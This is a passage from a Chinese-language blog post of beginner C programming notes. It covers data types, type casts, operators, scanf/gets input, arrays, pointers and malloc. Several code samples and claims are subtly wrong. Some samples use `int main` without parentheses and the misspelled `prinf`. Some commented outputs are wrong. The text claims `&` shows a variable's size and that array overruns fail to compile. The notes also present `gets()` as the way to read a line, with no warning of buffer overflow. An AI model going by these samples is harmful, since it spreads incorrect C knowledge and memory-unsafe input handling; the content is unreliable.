bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c</span><br><span class="line"></span><br><span class="line">main.c main</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li><code>main.c</code>：源代码文件</li><li><code>main.o</code>：源代码文件通过编译之后生成的本地代码（机器语言）</li><li><code>main</code>：可执行文件</li><li><code>a.out</code>：可执行文件（默认名称）</li></ul><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>在C 语言中，数据类型大致可以分为以下几种：</p><ol><li>基本类型：整型、字符型、浮点型</li><li>构造类型：数组类型、结构类型、联合类型、枚举类型</li><li>指针类型</li><li>void 类型</li></ol><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><table><thead><tr><th align="left">类型</th><th align="left">存储大小</th><th align="left">值范围</th></tr></thead><tbody><tr><td align="left">char</td><td align="left">1 字节</td><td align="left">-128 到 127 或 0 到 255</td></tr><tr><td align="left">unsigned char</td><td align="left">1 字节</td><td align="left">0 到 255</td></tr><tr><td align="left">signed char</td><td align="left">1 字节</td><td align="left">-128 到 127</td></tr><tr><td align="left">int</td><td align="left">2 或 4 字节</td><td align="left">-32,768 到 32,767 或 -2,147,483,648 到 2,147,483,647</td></tr><tr><td align="left">unsigned int</td><td align="left">2 或 4 字节</td><td align="left">0 到 65,535 或 0 到 4,294,967,295</td></tr><tr><td align="left">short</td><td align="left">2 字节</td><td align="left">-32,768 到 32,767</td></tr><tr><td align="left">unsigned short</td><td align="left">2 字节</td><td align="left">0 到 65,535</td></tr><tr><td align="left">long</td><td align="left">4 字节</td><td align="left">-2,147,483,648 到 2,147,483,647</td></tr><tr><td align="left">unsigned long</td><td align="left">4 字节</td><td align="left">0 到 4,294,967,295</td></tr></tbody></table><h3 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h3><table><thead><tr><th align="left">类型</th><th align="left">存储大小</th><th align="left">值范围</th><th align="left">精度</th></tr></thead><tbody><tr><td align="left">float</td><td align="left">4 字节</td><td align="left">1.2E-38 到 3.4E+38</td><td align="left">6 位有效位</td></tr><tr><td align="left">double</td><td align="left">8 字节</td><td align="left">2.3E-308 到 1.7E+308</td><td align="left">15 位有效位</td></tr><tr><td align="left">long double</td><td align="left">16 字节</td><td align="left">3.4E-4932 到 1.1E+4932</td><td align="left">19 位有效位</td></tr></tbody></table><blockquote><p>需要注意的是，各种类型的存储大小与系统位数有关，但目前通用的以64位系统为主。</p></blockquote><p>在 C 语言中，通过取地址符(&amp;) 即可看见变量在内存所占空间大小。</p><hr><p>C 语言中的数据类型：</p><ul><li>字符型常量：用单引号括起来的一个字符，如果用双引号或者单引号内有N 个字符，则都不是字符型常量。</li><li>字符串常量：用双引号括起来的字符序列</li></ul><p>在C 语言中，并没有对应的字符串变量，不会像PHP 语言专门有一个<code>String</code> 类型来存储对应的字符变量。</p><p>那么该如何存储字符串呢？<br>在C 语言中，是通过字符数组来存储字符串的。</p><p>字符串是由字符组成的，对于计算机而言，字符串是由一个个字符组成的，而一个字符的大小是一个字节。<br>China 这个字符串在计算机中，所占的大小是六个字节而不是五个，这是因为最后一个字符是由<code>\0</code> 结尾，也需要占用一个字节。</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>C 语言在做混合运算时，因为是强类型的语言，当做算术运算时，C 语言会按照变量的数据类型去进行运算。</p><p>在以下示例中，如果直接进行运算，得到的结果并不是我们所期望的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> main</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">float</span> f = i / <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%f \n"</span>, f);  <span class="comment">// 2.0000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以为了能正常输出 <code>2.5</code>，需要将这个表达式给转换为为浮点型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> main</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">float</span> f = (<span class="keyword">float</span>)i / <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%f \n"</span>, f);  <span class="comment">// 2.5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看另外一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">3.33</span>;</span><br><span class="line">    <span class="keyword">int</span> i = a / <span class="number">1.11</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d \n"</span>, i);  <span class="comment">// 2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么得到的结果不是 3 ，而是 2？</p><p>这是因为C 语言，对于没有声明为变量的浮点型会默认转换为 <code>double</code> 双精度类型：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220509221329.png" alt=""></p><p>而如果另一个变量的并不是浮点类型，比如是 <code>float</code> 类型，此时这两个精度不一样的浮点数直接进行运算就会丢失精度。</p><p>所以呢，在C 语言中进行算术运算时，需要保证数据类型在预期内。<br>对于上面的问题，有两种方案：</p><ol><li>将变量a 转换为 <code>double</code> 类型</li><li>将 1.11 强制转换为 <code>float</code> 类型</li></ol><h2 id="运算符与表达式"><a href="#运算符与表达式" class="headerlink" title="运算符与表达式"></a>运算符与表达式</h2><p>运算符的种类：</p><ol><li>算术运算符</li><li>关系运算符</li><li>逻辑运算符</li><li>位运算符</li><li>赋值运算符</li><li>条件运算符</li><li>逗号运算符</li><li>指针运算符</li><li>求字节数运算符</li><li>强制类型转换运算符</li><li>分量运算符</li><li>下标运算符</li><li>其他（如函数调用运算符）</li></ol><hr><p><code>i++</code> 和 <code>++i</code> 的区别：</p><ul><li><code>i++</code> 是先进行运算符，最后才对变量 i 进行<code>+1</code></li><li><code>++i</code> 则刚好是相反的，先对变量 i 进行 <code>+1</code>，然后进行其他运算</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> j = i ++ &lt; <span class="number">-1</span>;</span><br><span class="line">    prinf(<span class="string">"i = %d, j = %d \n"</span>, i, j);   <span class="comment">// i = 0, j = 0</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// int i = 1;</span></span><br><span class="line">    <span class="comment">// int j = ++i &lt; -1;</span></span><br><span class="line">    <span class="comment">// prinf("i = %d, j = %d \n", i, j);   // i = 0, j = 1</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>C 语言中没有布尔类型。<br>C 语言认为一切非零的值都是真。</p><p>下面这段代码这样写是有问题的，因为 <code>char</code> 类型所占空间大小是一个字节，而 <code>scanf</code> 获取标准输入的是一个整型，而整型所占空间大小又是四个字节，所以这段代码运行之后会报错。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;c);</span><br><span class="line">    prinf(<span class="string">"c = %c \n"</span>, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确的实例，应该是这样，定义变量时，使用 <code>int</code> 类型去定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;c);</span><br><span class="line">    prinf(<span class="string">"c = %c \n"</span>, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取输入与输出"><a href="#获取输入与输出" class="headerlink" title="获取输入与输出"></a>获取输入与输出</h2><h3 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h3><p>整型、浮点型、字符型需要使用取地址符。</p><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><p><code>printf</code> 函数：</p><ul><li><code>%d</code>：以整型输出对应数据</li><li><code>%f</code>：以浮点型输出对应数据</li><li><code>%c</code>：以字符型输出对应数据</li></ul><h3 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h3><p>当一次读取一行内容时，可以使用 gets</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> c[<span class="number">20</span>];</span><br><span class="line">gets(c);</span><br></pre></td></tr></table></figure><p>使用 scanf 获取标准输入时，会遇到一个问题，当输入的字符中间存在空格时，会结束匹配，这样就没有办法把一行带有空格的字符串存到一个字符数组中了。</p><p>gets 的原理：<br>会从缓冲区中一直进行读取，直到遇到 <code>\n</code> 结束符。</p><p>而 <code>scanf</code> 则会匹配 <code>\n</code> 结束符之前的所有内容，也就是它会把 <code>\n</code> 结束符留在缓冲区中。所以当 <code>scanf</code> 和 <code>gets</code> 函数一起使用时，需要主动去掉结束符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">// char c[20];</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;i);</span><br><span class="line">    <span class="keyword">char</span> *p = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(i);</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;c);</span><br><span class="line">    gets(p);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>否则 <code>gets</code> 获取不到标准输入。</p><h3 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h3><p>输出字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>()、</span><br><span class="line"><span class="comment">// 等价于 print_f("%s \n", p); 这里的p 要求是一个字符指针</span></span><br><span class="line"><span class="comment">// puts 访问的是字符指针的地址，然后遍历将里面的值依次 print 出来</span></span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>C 语言的数组。</p><p>使用C 语言的数组时，需要注意哪些问题？</p><ol><li>数组访问越界的问题</li><li>C 语言会对字符串常量，自动增加一个<code>\0</code>，所以当使用数组存在字符串常量时，需要注意数组的索引长度</li></ol><p>字符串为什么需要有结束符？<br>因为需要有一个结束符，能让C 语言知道这个字符在什么位置结束。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220509225407.png" alt=""></p><p>在Mac 下，数组一旦越界了，编译会过不了。</p><hr><p>C 语言规定字符串的结束标记为 <code>\0</code>，系统会对字符串常量自动加一个 <code>\0</code>，所以字符数组存储的字符串长度必须比字符数组少 1 字节。</p><p>整型数组在传递实参时，需要一并把数组的长度给传过去。<br>而字符数组则不用，</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>每一个函数在执行完成之后，都会被栈空间释放掉。</p><p>函数间的调用关系是，由主函数调用其他函数，其他函数之间也可以相互调用，同一个函数可以被一个或者多个函数调用 N 次。</p><p>函数的声明与定义是有区别的：</p><ol><li>函数的定义是指对函数功能的确立，包括指定函数名、函数值类型、形参及其类型、函数体等，它是一个完整的、独立的函数单位。</li><li>函数的声明的作用是把函数的名字、函数类型及形参的类型、个数和顺序通知编译系统，以便在调试该函数时编译系统能正确识别函数并检查调用是否合法</li></ol><p>C 语言的局部变量、全局变量和其他语言是很像的，没有太多需要注意的地方，只是在 C 语言中尽量不要使用全局变量，程序容易出错。</p><hr><p>获取字符数组的索引长度使用 <code>sizeof</code>，获取字符数组的字符长度使用 <code>strlen</code>。</p><p>遍历一个字符数组时，尽管输出的是 <code>1</code>，但要明确它是一个字符类型，而不是整型。<br>所以在进行比较时，需要时刻保证等式两边的数据类型是一致的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> ret[<span class="number">20</span>];</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%d \n"</span>, <span class="keyword">sizeof</span>(ret));  <span class="comment">// 80   </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%d \n"</span>, <span class="built_in">strlen</span>(ret));  <span class="comment">// 0    索引长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在做 C 语言字符串拼接、替换相关的题目时，需要注意使用 <code>\0</code> 作为结束符。</p><p><code>scanf</code> 会从缓冲区中读取对应的内容，直至遇到 <code>\n</code> 才会停止读取，不会读取 <code>\n</code>。<br>而 <code>gets</code> 函数也是从缓冲区里面读取，遇到 <code>\n</code> 就结束。</p><p>所以使用完 <code>scanf</code> 之后，如果不主动消除 <code>\n</code>，直接使用 <code>gets</code> 会导致程序直接向下继续执行，因为 <code>gets</code> 读取到的是结束符 <code>\n</code>。</p><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><p>指针的本质就是地址。</p><p>一个变量在内存中，可以分为两部分：编址（变量的地址）和具体的值。</p><p>如果想把某个变量的地址保存下来，就需要用到指针。</p><p>&amp; 是取地址符号，也称为引用，通过该操作符可以获取一个变量的地址值。* 是取值操作符，也称为解引用，通过这个操作符可以获取一个地址对应的数据。</p><p>指针的使用场景总结下来只有两种：</p><ol><li>传递</li><li>偏移</li></ol><p>函数具有自己的内存空间，在某个函数中定义了一个变量之后，就会在这个内存中开辟对应大小的内存空间。<br>值传递是不会改变原值的。</p><p><code>&amp;</code> 符号的作用是获取变量的地址，<code>*</code> 符号的作用是通过变量的地址获取对应的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">5</span>;    <span class="comment">// 定义一个变量 i 值为 5</span></span><br><span class="line">    <span class="keyword">int</span>* p = &amp;i;  <span class="comment">// 定义一个整型指针变量，值为变量 i 的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"i = %d \n"</span>, i);  <span class="comment">// 直接访问</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"*p = %d \n"</span>, *p); <span class="comment">// 通过取值操作符间接访问变量 p</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>字符数组的数组名里存的就是字符数组的起始地址。类型是字符指针。</p><p>数组名的类型是数组，里面存了一个值，就是数组的起始地址，</p><h3 id="指针的传递"><a href="#指针的传递" class="headerlink" title="指针的传递"></a>指针的传递</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> *j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *j = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"修改之前i = %d \n"</span>, i);  <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">    change(&amp;i);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"修改之后i = %d \n"</span>, i);  <span class="comment">// 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指针的偏移"><a href="#指针的偏移" class="headerlink" title="指针的偏移"></a>指针的偏移</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>* p;  <span class="comment">// 定义一个整型指针变量</span></span><br><span class="line">    p = arr;  <span class="comment">// 因为数组的名称就是数组的起始地址，所以这里直接把对应地址赋值给整型指针 p</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"*p = %d \n"</span>, *p);  <span class="comment">// 对一个指针变量进行取值时（需要取值操作符），得到的是其基类型</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针的偏移</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 对指针进行偏移时，每次的偏移量是对应的基类型大小</span></span><br><span class="line">        <span class="comment">// 比如这里对指针 p 进行偏移（+ 1），其实对应的内存中的</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d \n"</span>, *(p + i));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指针与一维数组"><a href="#指针与一维数组" class="headerlink" title="指针与一维数组"></a>指针与一维数组</h3><p>数组在传递时会弱化为指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这两种写法是一样的</span></span><br><span class="line"><span class="comment">// void change(char d[])</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     printf("%c \n", *d);   // h</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">char</span> *d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c \n"</span>, *d);      <span class="comment">// h</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">10</span>] = <span class="string">"hello"</span>;</span><br><span class="line">    change(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一维数组在进行函数调用时，为什么它的长度子函数没有办法知道？<br>这是因为一位数组的数组名存储的是数组的首地址（也就是索引为零的值的地址），压根就不是数组，所以没有办法直接知道对应长度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">char</span> *d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *d = <span class="string">'H'</span>;</span><br><span class="line">    <span class="comment">// 等价于</span></span><br><span class="line">    <span class="comment">// d[0] = 'H';</span></span><br><span class="line">    <span class="comment">// 这两种方式都可以改变数组内的值，不过需要注意的是，赋值表达式两边的类型需要保持一致</span></span><br><span class="line">    <span class="comment">// d[1] = 'E';</span></span><br><span class="line">    <span class="comment">// *(d+1) = 'E';</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c \n"</span>, *d);  <span class="comment">// h</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么在子函数内部可以对数组进行访问和修改？<br>这里其实用到了指针的传递与偏移。</p><h3 id="指针与动态申请内存"><a href="#指针与动态申请内存" class="headerlink" title="指针与动态申请内存"></a>指针与动态申请内存</h3><p>数组一开始定义好就确定下来了，数组是放在栈空间的。</p><p>栈空间的大小在编译时是确定的，如果使用大小不确定，那么就要使用堆空间。</p><p>申请堆空间，会把一个连续的 N 个字节的空间给你，返回的是一个起始地址。<br><code>malloc</code> 申请空间的单位是字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p1;</span><br><span class="line">    <span class="keyword">int</span> *p2;</span><br><span class="line">    p1 = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">20</span>); <span class="comment">// p1 最多可以存储 19 个字符</span></span><br><span class="line">    p2 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">20</span>);  <span class="comment">// p2 最多可以存在 5 个整型数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>野指针是什么？</p><p>当一个指针指向一块空间，而这个空间又不属于它，这就是野指针。</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>使用结构体之前，需要先声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 